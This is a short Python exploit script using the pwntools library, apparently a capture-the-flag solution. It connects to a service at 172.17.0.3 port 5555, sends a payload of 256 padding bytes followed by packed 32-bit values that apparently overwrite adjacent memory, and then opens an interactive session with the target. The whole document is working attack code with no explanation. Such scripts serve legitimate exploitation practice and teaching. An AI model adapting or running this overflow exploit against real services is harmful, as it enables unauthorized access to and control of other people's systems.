#!/usr/bin/env python3

from pwn import *

proc = remote("172.17.0.3", 5555)

payload  = b'\n'
payload += b'A'*256
payload += p32(0x00001000)
payload += p32(0x00000000)
payload += p32(0xB3350000)
payload += p32(0xFFFFFE49)
payload += p32(0x00000800)
payload += b'\n'

proc.sendline(payload)
proc.interactive()
